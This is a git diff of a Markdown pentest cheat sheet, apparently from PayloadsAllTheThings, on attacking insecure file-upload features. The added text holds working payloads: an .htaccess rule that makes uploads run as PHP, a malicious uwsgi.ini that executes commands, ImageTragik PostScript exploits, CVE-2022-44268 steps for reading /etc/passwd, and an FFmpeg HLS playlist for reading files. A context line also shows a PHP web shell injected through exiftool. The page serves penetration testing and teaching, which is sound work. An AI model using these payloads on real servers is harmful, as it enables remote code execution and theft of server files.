@@ -9,19 +9,19 @@
     * [Defaults extensions](#defaults-extensions)
     * [Upload tricks](#upload-tricks)
     * [Filename vulnerabilities](#filename-vulnerabilities)
-    * [Picture compression](#picture-compression-)
+    * [Picture compression](#picture-compression)
+    * [Picture Metadata](#picture-metadata)
     * [Configuration Files](#configuration-files)
     * [CVE - ImageMagick](#cve---imagemagick)
-    * [CVE - FFMpeg](#cve---ffmpeg)
-    * [ZIP Archive](#zip-archive)
-    * [Jetty RCE](#jetty-rce)
+    * [CVE - FFMpeg HLS](#cve---ffmpeg-hls)
 * [References](#references)
 
 
 ## Tools
-- [Fuxploider](https://github.com/almandin/fuxploider)
-- [Burp > Upload Scanner](https://portswigger.net/bappstore/b2244cbb6953442cb3c82fa0a0d908fa)
-- [ZAP > FileUpload AddOn](https://www.zaproxy.org/blog/2021-08-20-zap-fileupload-addon/)
+
+- [almandin/fuxploiderFuxploider](https://github.com/almandin/fuxploider) - File upload vulnerability scanner and exploitation tool. 
+- [Burp/Upload Scanner](https://portswigger.net/bappstore/b2244cbb6953442cb3c82fa0a0d908fa) -  HTTP file upload scanner for Burp Proxy.
+- [ZAP/FileUpload](https://www.zaproxy.org/blog/2021-08-20-zap-fileupload-addon/) -  OWASP ZAP add-on for finding vulnerabilities in File Upload functionality.
 
 
 ## Exploits
@@ -108,6 +108,7 @@ Sometimes the vulnerability is not the upload but how the file is handled after.
 - Command Injection e.g. `; sleep 10;`
 
 Also you upload:
+
 - HTML/SVG files to trigger an XSS
 - EICAR file to check the presence of an antivirus
 
@@ -122,7 +123,7 @@ Create valid pictures hosting PHP code. Upload the picture and use a **Local Fil
     - [GIF](https://blog.isec.pl/injection-points-in-popular-image-formats/): use createGIFwithGlobalColorTable.php
 
 
-### Picture with custom metadata
+### Picture Metadata
 
 Create a custom picture and insert exif tag with `exiftool`. A list of multiple exif tags can be found at [exiv2.org](https://exiv2.org/tags.html)
 
@@ -135,16 +136,64 @@ exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __h
 ### Configuration Files
 
 If you are trying to upload files to a :
+
 - PHP server, take a look at the [.htaccess](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess) trick to execute code.
 - ASP server, take a look at the [web.config](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config) trick to execute code.
 - uWSGI server, take a look at the [uwsgi.ini](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20uwsgi.ini/uwsgi.ini) trick to execute code.
 
 Configuration files examples
-- [.htaccess](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess)
-- [web.config](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config)
-- [httpd.conf](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Busybox%20httpd.conf)
-- [\_\_init\_\_.py](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Python%20__init__.py)
-- [uwsgi.ini](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20uwsgi.ini/uwsgi.ini)
+
+- [Apache: .htaccess](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess)
+- [IIS: web.config](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config)
+- [Python: \_\_init\_\_.py](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Python%20__init__.py)
+- [WSGI: uwsgi.ini](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20uwsgi.ini/uwsgi.ini)
+
+
+#### Apache: .htaccess
+
+The `AddType` directive in an `.htaccess` file is used to specify the MIME (Multipurpose Internet Mail Extensions) type for different file extensions on an Apache HTTP Server. This directive helps the server understand how to handle different types of files and what content type to associate with them when serving them to clients (such as web browsers).  
+
+Here is the basic syntax of the AddType directive: 
+
+```ps1
+AddType mime-type extension [extension ...]
+```
+
+Exploit `AddType` directive by uploading an .htaccess file with the following content. 
+
+```ps1
+AddType application/x-httpd-php .rce
+```
+
+Then upload any file with `.rce` extension.
+
+
+#### WSGI: uwsgi.ini
+
+uWSGI configuration files can include “magic” variables, placeholders and operators defined with a precise syntax. The ‘@’ operator in particular is used in the form of @(filename) to include the contents of a file. Many uWSGI schemes are supported, including “exec” - useful to read from a process’s standard output. These operators can be weaponized for Remote Command Execution or Arbitrary File Write/Read when a .ini configuration file is parsed:
+
+Example of a malicious `uwsgi.ini` file:
+
+```ini
+[uwsgi]
+; read from a symbol
+foo = @(sym://uwsgi_funny_function)
+; read from binary appended data
+bar = @(data://[REDACTED])
+; read from http
+test = @(http://[REDACTED])
+; read from a file descriptor
+content = @(fd://[REDACTED])
+; read from a process stdout
+body = @(exec://whoami)
+; call a function returning a char *
+characters = @(call://uwsgi_func)
+```
+
+When the configuration file will be parsed (e.g. restart, crash or autoreload) payload will be executed.
+
+
+#### Dependency Manager
 
 Alternatively you may be able to upload a JSON file with a custom scripts, try to overwrite a dependency manager configuration file.
 - package.json
@@ -162,11 +211,16 @@ Alternatively you may be able to upload a JSON file with a custom scripts, try t
     }
     ```
 
+
 ### CVE - ImageMagick
 
 If the backend is using ImageMagick to resize/convert user images, you can try to exploit well-known vulnerabilities such as ImageTragik.
 
-* ImageTragik example: Upload this content with an image extension to exploit the vulnerability (ImageMagick , 7.0.1-1)
+#### CVE-2016–3714 - ImageTragik 
+
+Upload this content with an image extension to exploit the vulnerability (ImageMagick , 7.0.1-1)
+
+* ImageTragik - example #1
     ```powershell
     push graphic-context
     viewbox 0 0 640 480
@@ -174,29 +228,65 @@ If the backend is using ImageMagick to resize/convert user images, you can try t
     pop graphic-context
     ```
 
-More payloads in the folder `Picture ImageMagick`
-
-### CVE - FFMpeg
-
-FFmpeg HLS vulnerability
-
-
-### ZIP archive
-
-When a ZIP/archive file is automatically decompressed after the upload
-
-* Zip Slip: directory traversal to write a file somewhere else
-    ```python
-    python evilarc.py shell.php -o unix -f shell.zip -p var/www/html/ -d 15
-
-    ln -s ../../../index.php symindex.txt
-    zip --symlinks test.zip symindex.txt
+* ImageTragik - example #3
+    ```powershell
+    %!PS
+    userdict /setpagedevice undef
+    save
+    legal
+    { null restore } stopped { pop } if
+    { legal } stopped { pop } if
+    restore
+    mark /OutputFile (%pipe%id) currentdevice putdeviceprops
     ```
 
-### Jetty RCE
+The vulnerability can be triggered by using the `convert` command.
 
-Upload the XML file to `$JETTY_BASE/webapps/`
-* [JettyShell.xml - From Mikhail Klyuchnikov](https://raw.githubusercontent.com/Mike-n1/tips/main/JettyShell.xml)
+```ps1
+convert shellexec.jpeg whatever.gif
+```
+
+
+#### CVE-2022-44268
+
+CVE-2022-44268 is an information disclosure vulnerability identified in ImageMagick. An attacker can exploit this by crafting a malicious image file that, when processed by ImageMagick, can disclose information from the local filesystem of the server running the vulnerable version of the software.
+
+* Generate the payload
+    ```ps1
+    apt-get install pngcrush imagemagick exiftool exiv2 -y
+    pngcrush -text a "profile" "/etc/passwd" exploit.png
+    ```
+* Trigger the exploit by uploading the file. The backend might use something like `convert pngout.png pngconverted.png`
+* Download the converted picture and inspect its content with: `identify -verbose pngconverted.png`
+* Convert the exfiltrated data: `python3 -c 'print(bytes.fromhex("HEX_FROM_FILE").decode("utf-8"))'` 
+
+More payloads in the folder `Picture ImageMagick/`.
+
+
+### CVE - FFMpeg HLS
+
+FFmpeg is an open source software used for processing audio and video formats. You can use a malicious HLS playlist inside an AVI video to read arbitrary files.
+
+1. `./gen_xbin_avi.py file://<filename> file_read.avi`
+2. Upload `file_read.avi` to some website that processes videofiles
+3. On server side, done by the videoservice: `ffmpeg -i file_read.avi output.mp4`
+4. Click "Play" in the videoservice.
+5. If you are lucky, you'll the content of `<filename>` from the server.
+
+The script creates an AVI that contains an HLS playlist inside GAB2. The playlist generated by this script looks like this:
+
+```ps1
+#EXTM3U
+#EXT-X-MEDIA-SEQUENCE:0
+#EXTINF:1.0
+GOD.txt
+#EXTINF:1.0
+/etc/passwd
+#EXT-X-ENDLIST
+```
+
+More payloads in the folder `CVE FFmpeg HLS/`.
+
 
 ## Labs 
 
@@ -205,18 +295,20 @@ Upload the XML file to `$JETTY_BASE/webapps/`
 
 ## References
 
-* [Bulletproof Jpegs Generator - Damien "virtualabs" Cauquil](https://virtualabs.fr/Nasty-bulletproof-Jpegs-l)
-* [BookFresh Tricky File Upload Bypass to RCE, NOV 29, 2014 - AHMED ABOUL-ELA](https://secgeek.net/bookfresh-vulnerability/)
-* [Encoding Web Shells in PNG IDAT chunks, 04-06-2012, phil](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
-* [La PNG qui se prenait pour du PHP, 23 février 2014](https://phil242.wordpress.com/2014/02/23/la-png-qui-se-prenait-pour-du-php/)
-* [File Upload restrictions bypass - Haboob Team](https://www.exploit-db.com/docs/english/45074-file-upload-restrictions-bypass.pdf)
-* [File Upload - Mahmoud M. Awali / @0xAwali](https://docs.google.com/presentation/d/1-YwXl9rhzSvvqVvE_bMZo2ab-0O5wRNTnzoihB9x6jI/edit#slide=id.ga2ef157b83_1_0)
-* [IIS - SOAP](https://red.0xbad53c.com/red-team-operations/initial-access/webshells/iis-soap)
-* [Arbitrary File Upload Tricks In Java - pyn3rd](https://pyn3rd.github.io/2022/05/07/Arbitrary-File-Upload-Tricks-In-Java/)
-* [File Upload - HackTricks](https://book.hacktricks.xyz/pentesting-web/file-upload)
+* [A New Vector For “Dirty” Arbitrary File Write to RCE - Doyensec - Maxence Schmitt and Lorenzo Stella - 28 Feb 2023](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
+* [Arbitrary File Upload Tricks In Java - pyn3rd - 2022-05-07](https://pyn3rd.github.io/2022/05/07/Arbitrary-File-Upload-Tricks-In-Java/)
+* [Attacking Webservers Via .htaccess - Eldar Marcussen - May 17, 2011](http://www.justanotherhacker.com/2011/05/htaccess-based-attacks.html)
+* [BookFresh Tricky File Upload Bypass to RCE - Ahmed Aboul-Ela - November 29, 2014](http://web.archive.org/web/20141231210005/https://secgeek.net/bookfresh-vulnerability/)
+* [Bulletproof Jpegs Generator - Damien Cauquil (@virtualabs) - April 9, 2012 ](https://virtualabs.fr/Nasty-bulletproof-Jpegs-l)
+* [Encoding Web Shells in PNG IDAT chunks - phil - 04-06-2012](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
+* [File Upload - HackTricks - 20/7/2024](https://book.hacktricks.xyz/pentesting-web/file-upload)
+* [File Upload restrictions bypass - Haboob Team - July 24, 2018](https://www.exploit-db.com/docs/english/45074-file-upload-restrictions-bypass.pdf)
+* [IIS - SOAP - Navigating The Shadows - 0xbad53c - 19/5/2024](https://red.0xbad53c.com/red-team-operations/initial-access/webshells/iis-soap)
 * [Injection points in popular image formats - Daniel Kalinowski‌‌ - Nov 8, 2019](https://blog.isec.pl/injection-points-in-popular-image-formats/)
-* [A tip for getting RCE in Jetty apps with just one XML file! - Aug 4, 2022 - PT SWARM / @ptswarm](https://twitter.com/ptswarm/status/1555184661751648256/)
-* [Jetty Features for Hacking Web Apps - September 15, 2022 - Mikhail Klyuchnikov](https://swarm.ptsecurity.com/jetty-features-for-hacking-web-apps/)
-* [Inyección de código en imágenes subidas y tratadas con PHP-GD  - Spanish Resource - hackplayers](https://www.hackplayers.com/2020/03/inyeccion-de-codigo-en-imagenes-php-gd.html)
-* [A New Vector For “Dirty” Arbitrary File Write to RCE - Doyensec - Maxence Schmitt and Lorenzo Stella](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
-* [PHP Internals Book - THE .PHPT FILE STRUCTURE](https://www.phpinternalsbook.com/tests/phpt_file_structure.html)
+* [Insomnihack Teaser 2019 / l33t-hoster - Ian Bouchard (@Corb3nik) - January 20, 2019](http://corb3nik.github.io/blog/insomnihack-teaser-2019/l33t-hoster)
+* [Inyección de código en imágenes subidas y tratadas con PHP-GD - hackplayers - March 22, 2020](https://www.hackplayers.com/2020/03/inyeccion-de-codigo-en-imagenes-php-gd.html)
+* [La PNG qui se prenait pour du PHP - Philippe Paget (@PagetPhil) - February, 23 2014](https://phil242.wordpress.com/2014/02/23/la-png-qui-se-prenait-pour-du-php/)
+* [More Ghostscript Issues: Should we disable PS coders in policy.xml by default? - Tavis Ormandy - 21 Aug 2018](http://openwall.com/lists/oss-security/2018/08/21/2)
+* [PHDays - Attacks on video converters:a year later - Emil Lerner, Pavel Cheremushkin - December 20, 2017](https://docs.google.com/presentation/d/1yqWy_aE3dQNXAhW8kxMxRqtP7qMHaIfMzUDpEqFneos/edit#slide=id.p)
+* [Protection from Unrestricted File Upload Vulnerability - Narendra Shinde - October 22, 2015 ](https://blog.qualys.com/securitylabs/2015/10/22/unrestricted-file-upload-vulnerability)
+* [The .phpt File Structure - PHP Internals Book - October 18, 2017](https://www.phpinternalsbook.com/tests/phpt_file_structure.html)
